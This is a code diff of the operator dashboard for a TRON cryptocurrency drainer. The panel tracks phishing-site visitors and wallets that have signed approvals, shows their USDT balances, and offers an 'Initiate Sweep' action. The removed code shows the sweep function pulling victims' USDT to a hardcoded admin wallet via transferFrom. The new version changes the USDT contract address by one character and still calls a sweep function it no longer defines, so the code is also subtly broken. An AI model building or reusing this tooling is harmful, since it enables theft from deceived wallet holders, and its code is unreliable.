@@ -4,177 +4,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Admin Elite - Premium Dashboard</title>
+    <title>Elite Admin - Native Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap');
 
         body {
-            font-family: 'Inter', sans-serif;
-            background: #050505;
+            font-family: 'Outfit', sans-serif;
+            background: #000;
             color: #fff;
-            overflow-x: hidden;
+            overflow: hidden;
+            height: 100vh;
         }
 
         .glass {
             background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(20px);
+            backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .active-pulse::after {
-            content: '';
-            position: absolute;
-            top: -2px;
-            right: -2px;
-            width: 8px;
-            height: 8px;
-            background: #10b981;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
+        .tab-content {
+            display: none;
+            height: calc(100vh - 160px);
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
-        }
+        .tab-content.active { display: block; }
 
-        .user-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        .user-card:active { transform: scale(0.97); }
+        .nav-btn { transition: all 0.2s ease; }
+        .nav-btn.active { color: #3b82f6; transform: translateY(-2px); }
+        .nav-btn.active i { filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.5)); }
 
-        .swipe-indicator {
-            height: 4px; width: 40px; background: rgba(255, 255, 255, 0.2);
-            border-radius: 2px; margin: 8px auto;
+        .user-card { 
+            border-left: 3px solid transparent; 
+            transition: all 0.2s;
         }
+        .user-card.status-connected { border-left-color: #10b981; }
+        .user-card.status-pending { border-left-color: #3b82f6; }
 
         ::-webkit-scrollbar { width: 0; }
+        
+        /* Fix for small screens */
+        @media (max-width: 360px) {
+            .text-sm { font-size: 0.75rem; }
+            .p-5 { padding: 1rem; }
+        }
     </style>
 </head>
 
-<body class="p-0 m-0 min-h-screen">
+<body class="flex flex-col">
 
-    <!-- Login Screen -->
-    <div id="loginScreen" class="fixed inset-0 z-[100] bg-black flex items-center justify-center p-6">
-        <div class="w-full max-w-sm space-y-8 text-center">
-            <div class="w-20 h-20 bg-gradient-to-tr from-blue-600 to-indigo-600 rounded-3xl flex items-center justify-center mx-auto shadow-2xl shadow-blue-600/30 mb-8 rotate-12">
-                <i class="fas fa-crown text-3xl"></i>
+    <!-- Header -->
+    <header class="p-6 pb-2 flex justify-between items-end">
+        <div>
+            <h1 id="pageTitle" class="text-2xl font-black tracking-tighter">LIVE <span class="text-blue-500">FEED</span></h1>
+            <p id="liveClock" class="text-[9px] font-bold text-slate-500 tracking-[0.3em] uppercase">00:00:00</p>
+        </div>
+        <div class="flex gap-3">
+            <button onclick="toggleAudio()" id="audioBtn" class="w-10 h-10 rounded-2xl glass flex items-center justify-center text-slate-500">
+                <i class="fas fa-bell"></i>
+            </button>
+            <button onclick="clearAllData()" class="w-10 h-10 rounded-2xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/10">
+                <i class="fas fa-trash-alt text-xs"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Content Sections -->
+    <main class="flex-1 px-4 mt-4">
+        
+        <!-- Tab 1: Live Feed -->
+        <div id="tab-feed" class="tab-content active space-y-4">
+            <div class="grid grid-cols-2 gap-3">
+                <div class="glass p-4 rounded-3xl">
+                    <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Total Found</p>
+                    <p id="totalUsdt" class="text-lg font-black text-emerald-400 truncate">$0.00</p>
+                </div>
+                <div class="glass p-4 rounded-3xl">
+                    <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Active</p>
+                    <p id="userCount" class="text-lg font-black text-blue-400">0</p>
+                </div>
+            </div>
+            <div id="userList" class="space-y-3 pb-10">
+                <!-- Cards injected here -->
+            </div>
+        </div>
+
+        <!-- Tab 2: Balance Lookup -->
+        <div id="tab-lookup" class="tab-content space-y-6 pt-4">
+            <div class="glass p-6 rounded-[32px] border-blue-500/20">
+                <h3 class="text-xs font-bold text-blue-400 uppercase tracking-widest mb-4">Deep Wallet Scan</h3>
+                <div class="space-y-4">
+                    <div class="relative">
+                        <input type="text" id="manualAddress" placeholder="Enter TRON Address (T...)" 
+                            class="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 text-xs font-mono focus:outline-none focus:border-blue-500 transition-all">
+                    </div>
+                    <button onclick="checkManualBalance()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-blue-900/20 active:scale-[0.98]">
+                        Start Scan
+                    </button>
+                </div>
+            </div>
+
+            <div id="manualResult" class="hidden glass p-6 rounded-[32px] animate-pulse">
+                <div class="flex items-center justify-between mb-6">
+                    <div class="w-10 h-10 rounded-2xl bg-emerald-500/10 flex items-center justify-center">
+                        <i class="fas fa-shield-check text-emerald-500 text-xs"></i>
+                    </div>
+                    <span class="text-[10px] font-bold text-emerald-500 uppercase tracking-widest">Safe Result</span>
+                </div>
+                <div class="space-y-4">
+                    <div>
+                        <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">Address Detected</p>
+                        <p id="resAddr" class="text-[11px] font-mono text-blue-400 break-all">T...</p>
+                    </div>
+                    <div class="h-[1px] bg-white/5"></div>
+                    <div class="flex justify-between items-end">
+                        <div>
+                            <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">USDT Balance</p>
+                            <p id="resBal" class="text-3xl font-black text-emerald-400">$0.00</p>
+                        </div>
+                        <button onclick="copyRes()" class="text-slate-500 p-2"><i class="far fa-copy"></i></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Bottom Navigation -->
+    <nav class="glass mx-6 mb-8 rounded-[32px] p-2 flex justify-around items-center border-white/10">
+        <button onclick="switchTab('feed')" class="nav-btn active flex flex-col items-center gap-1 p-3">
+            <i class="fas fa-bolt-auto text-lg"></i>
+            <span class="text-[8px] font-bold uppercase tracking-widest">Feed</span>
+        </button>
+        <button onclick="switchTab('lookup')" class="nav-btn flex flex-col items-center gap-1 p-3">
+            <i class="fas fa-search-location text-lg"></i>
+            <span class="text-[8px] font-bold uppercase tracking-widest">Lookup</span>
+        </button>
+    </nav>
+
+    <!-- Custom Delete Modal -->
+    <div id="deleteModal" class="fixed inset-0 z-[110] bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-6">
+        <div class="glass w-full max-w-xs rounded-[40px] p-8 text-center space-y-6 scale-90 opacity-0 transition-all duration-300 transform" id="deleteModalContent">
+            <div class="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border border-red-500/20">
+                <i class="fas fa-exclamation-triangle text-2xl text-red-500 animate-pulse"></i>
             </div>
             <div>
-                <h2 class="text-4xl font-black tracking-tighter">Elite <span class="text-blue-500">Admin</span></h2>
-                <p class="text-slate-500 text-[10px] font-bold uppercase tracking-[0.3em] mt-2">Premium Execution Suite</p>
+                <h3 class="text-xl font-black tracking-tighter">PERMANENT DELETE?</h3>
+                <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mt-2 leading-relaxed">This action will erase the session data from the database forever.</p>
             </div>
-            <div class="space-y-4">
-                <input type="password" id="adminPass" placeholder="Security Code"
-                    class="w-full bg-white/5 border border-white/10 rounded-[24px] p-6 text-center text-xl font-bold focus:outline-none focus:border-blue-500 transition-all">
-                <button onclick="checkPass()"
-                    class="w-full bg-blue-600 hover:bg-blue-500 text-white font-black py-6 rounded-[24px] shadow-xl shadow-blue-900/20 active:scale-95 transition-all uppercase tracking-widest text-xs">
-                    Access Dashboard
-                </button>
+            <div class="flex flex-col gap-3">
+                <button onclick="confirmDelete()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-lg shadow-red-900/30 active:scale-95 transition-all">Destroy Data</button>
+                <button onclick="closeDeleteModal()" class="w-full bg-white/5 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest text-slate-400 active:scale-95 transition-all">Keep Session</button>
             </div>
-            <p id="loginError" class="text-red-500 text-[10px] font-black uppercase tracking-widest hidden">Access Denied</p>
         </div>
     </div>
 
-    <!-- Main Dashboard -->
-    <div id="mainDashboard" class="hidden">
-        <!-- Premium Header -->
-        <header class="fixed top-0 left-0 right-0 z-50 glass px-6 py-5 flex justify-between items-center">
-            <div>
-                <h1 class="text-xl font-black tracking-tighter">TRON<span class="text-blue-500">ELITE</span></h1>
-                <div id="liveClock" class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">00:00:00</div>
-            </div>
-            <div class="flex items-center gap-3">
-                <button onclick="clearAllData()" class="w-10 h-10 rounded-2xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/20">
-                    <i class="fas fa-trash-alt text-xs"></i>
-                </button>
-                <button onclick="toggleAudio()" id="audioBtn" class="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center text-slate-400">
-                    <i class="fas fa-bell"></i>
-                </button>
-            </div>
-        </header>
-
-        <main class="pt-28 pb-32 px-4 space-y-6">
-            <!-- Stats -->
-            <div class="grid grid-cols-2 gap-4">
-                <div class="glass p-5 rounded-[32px] bg-gradient-to-br from-white/[0.02] to-transparent">
-                    <div class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Portfolio Value</div>
-                    <div id="totalUsdt" class="text-2xl font-black text-emerald-400">$0.00</div>
+    <!-- Action Sheet -->
+    <div id="actionSheet" class="fixed inset-0 z-[100] bg-black/60 hidden backdrop-blur-sm" onclick="closeSheet()">
+        <div class="fixed bottom-0 left-0 right-0 glass rounded-t-[48px] p-8 space-y-6 transform translate-y-full transition-transform duration-300 ease-out" onclick="event.stopPropagation()">
+            <div class="w-12 h-1.5 bg-white/10 rounded-full mx-auto -mt-2"></div>
+            <div class="flex justify-between items-start pt-4">
+                <div class="min-w-0 flex-1 pr-4">
+                    <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 break-all font-bold">T...</h3>
+                    <p id="sheetTime" class="text-[9px] text-slate-500 font-bold uppercase mt-1">Status: Active</p>
                 </div>
-                <div class="glass p-5 rounded-[32px] bg-gradient-to-br from-white/[0.02] to-transparent">
-                    <div class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Active Targets</div>
-                    <div id="userCount" class="text-2xl font-black text-blue-400">0</div>
-                </div>
+                <button onclick="closeSheet()" class="text-slate-500 p-2"><i class="fas fa-times"></i></button>
             </div>
-
-            <!-- Search -->
-            <div class="relative">
-                <i class="fas fa-search absolute left-5 top-1/2 -translate-y-1/2 text-slate-600 text-xs"></i>
-                <input type="text" id="searchInput" oninput="renderUsers()" placeholder="Search address or status..." 
-                    class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-12 pr-6 text-xs font-bold focus:outline-none focus:border-blue-500/50">
-            </div>
-
-            <div class="flex justify-between items-center px-2">
-                <h2 class="text-[10px] font-black uppercase text-slate-500 tracking-[0.3em]">Live Feed</h2>
-                <div class="flex items-center gap-1.5">
-                    <div class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
-                    <span class="text-[9px] font-bold text-emerald-500 uppercase tracking-widest">Real-time</span>
-                </div>
-            </div>
-
-            <!-- List -->
-            <div id="userList" class="space-y-3"></div>
-        </main>
-
-        <!-- Action Sheet -->
-        <div id="actionSheet"
-            class="fixed bottom-0 left-0 right-0 z-50 glass rounded-t-[48px] px-8 pb-12 transform translate-y-full transition-transform duration-500 ease-[cubic-bezier(0.23,1,0.32,1)] border-t border-white/10 shadow-2xl">
-            <div class="swipe-indicator"></div>
             
-            <div class="flex justify-between items-start mt-8 mb-8">
-                <div class="max-w-[80%]">
-                    <div class="flex items-center gap-2 mb-1">
-                        <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 font-bold truncate">T...</h3>
-                        <button onclick="copyAddress()" class="text-slate-500 hover:text-white transition-colors">
-                            <i class="far fa-copy text-[10px]"></i>
-                        </button>
-                    </div>
-                    <p id="sheetTime" class="text-[9px] text-slate-500 font-bold uppercase tracking-[0.2em]">Connected at 00:00</p>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
+                    <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">USDT</p>
+                    <p id="sheetUsdt" class="text-2xl font-black text-emerald-400">0.00</p>
                 </div>
-                <button onclick="closeSheet()" class="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center">
-                    <i class="fas fa-times text-xs text-slate-400"></i>
-                </button>
+                <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
+                    <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">TRX</p>
+                    <p id="sheetTrx" class="text-2xl font-black text-blue-400">0.00</p>
+                </div>
             </div>
 
-            <div class="space-y-6">
-                <div class="grid grid-cols-2 gap-4">
-                    <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
-                        <div class="text-[9px] text-slate-500 font-bold uppercase mb-2">USDT Balance</div>
-                        <div id="sheetUsdt" class="text-xl font-black text-emerald-400">0.00</div>
-                    </div>
-                    <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
-                        <div class="text-[9px] text-slate-500 font-bold uppercase mb-2">TRX Balance</div>
-                        <div id="sheetTrx" class="text-xl font-black text-blue-400">0.00</div>
-                    </div>
-                </div>
-
-                <div class="space-y-3">
-                    <div class="flex justify-between items-center px-1">
-                        <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Execution Amount</label>
-                        <button onclick="setMax()" class="text-[9px] font-bold text-blue-500 uppercase hover:underline">Max</button>
-                    </div>
-                    <input id="sweepInput" type="number" step="any"
-                        class="w-full bg-white/5 border border-white/10 rounded-[24px] p-6 text-lg font-black focus:outline-none focus:border-blue-500 shadow-inner">
-                </div>
-
-                <button id="sweepBtn" onclick="executeSweep()"
-                    class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black py-6 rounded-[28px] uppercase tracking-[0.2em] text-xs shadow-xl shadow-blue-900/30 active:scale-[0.98] transition-all">
-                    Initiate Sweep
-                </button>
+            <div class="space-y-4">
+                <div class="flex justify-between px-1"><span class="text-[10px] font-bold text-slate-500 uppercase">Amount</span></div>
+                <input id="sweepInput" type="number" class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 font-black text-xl text-center focus:outline-none focus:border-blue-500">
+                <button id="sweepBtn" onclick="executeSweep()" class="w-full bg-blue-600 py-6 rounded-[24px] font-black uppercase text-xs tracking-[0.2em] shadow-xl active:scale-95 transition-all">Initiate Sweep</button>
             </div>
         </div>
     </div>
@@ -193,57 +210,48 @@
         };
 
         const CONFIG = {
-            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
-            PASS_HASH: "6de32b16d8fa5a4ff4f64bc471d9993e2ff594033fe43aa4622a753bcde5a38e"
+            USDT: "TR7NHqjeKQxGTC18q8ZY4pL8otSzgjLj6t",
+            ADMIN: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2"
         };
 
         let users = [];
         let audioEnabled = false;
         let selectedUser = null;
+        let tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
 
-        // --- Auth ---
-        async function sha256(m) {
-            const b = new TextEncoder().encode(m);
-            const h = await crypto.subtle.digest('SHA-256', b);
-            return Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, '0')).join('');
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+            event.currentTarget.classList.add('active');
+            document.getElementById('pageTitle').innerHTML = tab === 'feed' ? 'LIVE <span class="text-blue-500">FEED</span>' : 'WALLET <span class="text-blue-500">SCAN</span>';
         }
 
-        async function checkPass() {
-            const p = document.getElementById('adminPass').value;
-            if (await sha256(p) === CONFIG.PASS_HASH) {
-                document.getElementById('loginScreen').classList.add('hidden');
-                document.getElementById('mainDashboard').classList.remove('hidden');
-                localStorage.setItem('adminAuth', 'true');
-                startApp();
-            } else {
-                document.getElementById('loginError').classList.remove('hidden');
-            }
-        }
-
-        // --- Core ---
         function startApp() {
             if (firebase.apps.length === 0) firebase.initializeApp(firebaseConfig);
             const db = firebase.database();
 
-            // Clock
-            setInterval(() => {
-                document.getElementById('liveClock').innerText = new Date().toLocaleTimeString();
-            }, 1000);
+            setInterval(() => document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(), 1000);
 
-            // Listen
             db.ref('connections').on('value', (snap) => {
                 const data = snap.val();
-                if (!data) {
-                    users = [];
-                    renderUsers();
-                    return;
-                }
+                if (!data) { users = []; renderUsers(); return; }
                 const newUsers = Object.entries(data).map(([key, val]) => ({ ...val, id: key }));
-                newUsers.sort((a, b) => b.id - a.id);
+                newUsers.sort((a, b) => b.id.localeCompare(a.id));
                 
-                if (newUsers.length > users.length && audioEnabled) {
-                    document.getElementById('bellSound').play().catch(()=>{});
+                if (newUsers.length > users.length) {
+                    const newUser = newUsers[0];
+                    if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
+                    
+                    // Signal to Native Android App
+                    if (window.AndroidNative) {
+                        if (window.AndroidNative.triggerBeep) window.AndroidNative.triggerBeep();
+                        if (window.AndroidNative.showNotification) {
+                            const title = `🎯 ${newUser.status || 'New Activity'}`;
+                            const msg = newUser.address.includes('User') ? "Someone just landed on your site!" : `Wallet: ${newUser.address.substring(0,10)}...`;
+                            window.AndroidNative.showNotification(title, msg);
+                        }
+                    }
                 }
                 users = newUsers;
                 renderUsers();
@@ -252,110 +260,113 @@
 
         function renderUsers() {
             const list = document.getElementById('userList');
-            const search = document.getElementById('searchInput').value.toLowerCase();
             list.innerHTML = '';
             let total = 0;
 
             users.forEach(u => {
-                if (u.status !== 'LANDED' && u.status !== 'VISITOR') total += parseFloat(u.usdt);
+                if (u.status === 'CONNECTED' || u.status === 'PENDING_SIGN') total += parseFloat(u.usdt || 0);
                 
-                if (search && !u.address.toLowerCase().includes(search) && !u.status.toLowerCase().includes(search)) return;
-
                 const card = document.createElement('div');
-                card.className = "glass p-5 rounded-[28px] user-card flex justify-between items-center cursor-pointer relative overflow-hidden";
+                let sClass = u.status === 'CONNECTED' ? 'status-connected' : (u.status === 'PENDING_SIGN' ? 'status-pending' : '');
+                card.className = `glass p-4 rounded-3xl user-card ${sClass} flex justify-between items-center active:scale-95 transition-all`;
                 
-                let sColor = "text-blue-400", sIcon = "fa-wallet", sText = "Connected";
-                if (u.status === "LANDED") { sColor = "text-slate-500"; sIcon = "fa-eye"; sText = "Landed"; }
-                else if (u.status === "VISITOR") { sColor = "text-yellow-500"; sIcon = "fa-user-clock"; sText = "Visitor"; }
-                else if (u.status === "SUCCESS") { sColor = "text-emerald-500"; sIcon = "fa-check-double"; sText = "Success"; }
+                let sColor = "text-blue-400", sIcon = "fa-clock", sText = "Pending";
+                if (u.status === "ACTIVE") { sColor = "text-slate-500"; sIcon = "fa-eye"; sText = "Online"; }
+                else if (u.status === "CLICKED_NEXT") { sColor = "text-yellow-500"; sIcon = "fa-fingerprint"; sText = "Interested"; }
+                else if (u.status === "CONNECTED") { sColor = "text-emerald-500"; sIcon = "fa-check-double"; sText = "Signed"; }
+                else if (u.status === "REJECTED") { sColor = "text-red-500"; sIcon = "fa-times-circle"; sText = "Rejected"; }
+
+                const addr = u.address.includes('User') ? u.address : (u.address.substring(0, 6) + "..." + u.address.slice(-4));
 
                 card.innerHTML = `
-                    <div class="flex items-center gap-4 flex-1" onclick="openSheet('${u.id}')">
-                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center border border-white/5">
-                            <i class="fas ${sIcon} ${sColor} text-sm"></i>
-                        </div>
-                        <div class="min-w-0">
-                            <div class="text-sm font-mono font-bold truncate pr-4">${u.address.substring(0, 8)}...${u.address.slice(-6)}</div>
-                            <div class="text-[9px] text-slate-500 font-bold uppercase tracking-wider">${u.time} • ${u.trx} TRX</div>
+                    <div class="flex items-center gap-3 flex-1 min-w-0" onclick="openSheet('${u.id}')">
+                        <div class="w-10 h-10 bg-white/5 rounded-2xl flex items-center justify-center"><i class="fas ${sIcon} ${sColor} text-[12px]"></i></div>
+                        <div class="min-w-0 flex-1">
+                            <div class="text-[13px] font-bold truncate">${addr}</div>
+                            <div class="text-[8px] text-slate-500 font-bold uppercase tracking-wider">${u.time} • ${u.trx || '0'} TRX</div>
                         </div>
                     </div>
-                    <div class="text-right flex flex-col items-end gap-2">
-                        <div class="text-md font-black ${u.usdt > 0 ? 'text-emerald-400' : 'text-slate-600'}">$${u.usdt}</div>
-                        <div class="flex items-center gap-3">
-                            <div class="text-[8px] font-black uppercase tracking-widest ${sColor}">${sText}</div>
-                            <button onclick="deleteUser('${u.id}')" class="text-slate-700 hover:text-red-500 transition-colors p-1">
-                                <i class="fas fa-trash-alt text-[10px]"></i>
-                            </button>
-                        </div>
+                    <div class="text-right ml-2 shrink-0">
+                        <div class="text-sm font-black ${u.usdt > 0 ? 'text-emerald-400' : 'text-slate-700'}">$${u.usdt || '0.00'}</div>
+                        <div class="text-[7px] font-black uppercase tracking-widest ${sColor}">${sText}</div>
                     </div>
                 `;
                 list.appendChild(card);
             });
-
             document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
-            document.getElementById('userCount').innerText = users.filter(u => u.status !== 'LANDED').length;
+            document.getElementById('userCount').innerText = users.filter(u => u.status !== 'ACTIVE').length;
         }
 
-        // --- Actions ---
+        async function checkManualBalance() {
+            const addr = document.getElementById('manualAddress').value.trim();
+            if (!addr) return;
+            try {
+                const usdtContract = await tw.contract().at(CONFIG.USDT);
+                const bal = await usdtContract.balanceOf(addr).call();
+                const usdt = (parseInt(bal._hex || bal, 16) / 1e6).toFixed(2);
+                document.getElementById('resAddr').innerText = addr;
+                document.getElementById('resBal').innerText = "$" + usdt;
+                document.getElementById('manualResult').classList.remove('hidden');
+            } catch (e) { alert("Invalid Address"); }
+        }
+
         function openSheet(id) {
             selectedUser = users.find(u => u.id === id);
             document.getElementById('sheetAddress').innerText = selectedUser.address;
             document.getElementById('sheetUsdt').innerText = selectedUser.usdt;
             document.getElementById('sheetTrx').innerText = selectedUser.trx;
-            document.getElementById('sheetTime').innerText = `Activity detected at ${selectedUser.time}`;
+            document.getElementById('sheetTime').innerText = `Activity: ${selectedUser.time} • Status: ${selectedUser.status}`;
             document.getElementById('sweepInput').value = selectedUser.usdt;
-            document.getElementById('actionSheet').style.transform = 'translateY(0)';
+            const sheet = document.getElementById('actionSheet');
+            sheet.classList.remove('hidden');
+            setTimeout(() => sheet.children[0].classList.remove('translate-y-full'), 10);
         }
 
-        function closeSheet() { selectedUser = null; document.getElementById('actionSheet').style.transform = 'translateY(100%)'; }
-        
-        function setMax() { if (selectedUser) document.getElementById('sweepInput').value = selectedUser.usdt; }
+        function closeSheet() {
+            const sheet = document.getElementById('actionSheet');
+            sheet.children[0].classList.add('translate-y-full');
+            setTimeout(() => sheet.classList.add('hidden'), 300);
+        }
 
-        function copyAddress() {
-            if (!selectedUser) return;
-            navigator.clipboard.writeText(selectedUser.address);
-            const btn = document.querySelector('.far.fa-copy');
-            btn.className = 'fas fa-check text-emerald-500';
-            setTimeout(() => btn.className = 'far fa-copy text-[10px]', 2000);
+        let userToDelete = null;
+
+        function deleteUser(id) {
+            userToDelete = id;
+            const modal = document.getElementById('deleteModal');
+            const content = document.getElementById('deleteModalContent');
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                content.classList.remove('scale-90', 'opacity-0');
+                content.classList.add('scale-100', 'opacity-100');
+            }, 10);
+        }
+
+        function closeDeleteModal() {
+            const content = document.getElementById('deleteModalContent');
+            content.classList.add('scale-90', 'opacity-0');
+            content.classList.remove('scale-100', 'opacity-100');
+            setTimeout(() => {
+                document.getElementById('deleteModal').classList.add('hidden');
+                userToDelete = null;
+            }, 300);
+        }
+
+        async function confirmDelete() {
+            if (userToDelete) {
+                await firebase.database().ref('connections/' + userToDelete).remove();
+                closeDeleteModal();
+            }
         }
 
         function toggleAudio() {
             audioEnabled = !audioEnabled;
-            document.getElementById('audioBtn').className = `w-10 h-10 rounded-2xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white shadow-lg shadow-blue-900/40' : 'bg-white/5 text-slate-400'}`;
+            document.getElementById('audioBtn').className = `w-10 h-10 rounded-2xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white' : 'glass text-slate-500'}`;
             if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
         }
 
-        async function deleteUser(id) {
-            if (!confirm("Remove this entry permanently?")) return;
-            firebase.database().ref('connections/' + id).remove();
-        }
+        function clearAllData() { if (confirm("Clear All Sessions?")) firebase.database().ref('connections').remove(); }
 
-        async function clearAllData() {
-            if (!confirm("⚠️ EXTREME ACTION: Delete ALL visitor and connection data?")) return;
-            firebase.database().ref('connections').remove();
-        }
-
-        async function executeSweep() {
-            if (!window.tronWeb) return alert("Please use TronLink Browser!");
-            const amt = document.getElementById('sweepInput').value;
-            const btn = document.getElementById('sweepBtn');
-            try {
-                btn.disabled = true; btn.innerText = "Executing...";
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const sun = Math.floor(amt * 1000000);
-                const tx = await contract.transferFrom(selectedUser.address, CONFIG.ADMIN_WALLET, sun).send({ feeLimit: 150000000 });
-                alert("Success! TX: " + tx);
-                closeSheet();
-            } catch (e) { alert(e.message || "Failed"); }
-            finally { btn.disabled = false; btn.innerText = "Initiate Sweep"; }
-        }
-
-        if (localStorage.getItem('adminAuth') === 'true') {
-            document.getElementById('loginScreen').classList.add('hidden');
-            document.getElementById('mainDashboard').classList.remove('hidden');
-            startApp();
-        }
+        startApp();
     </script>
 </body>
-
 </html>
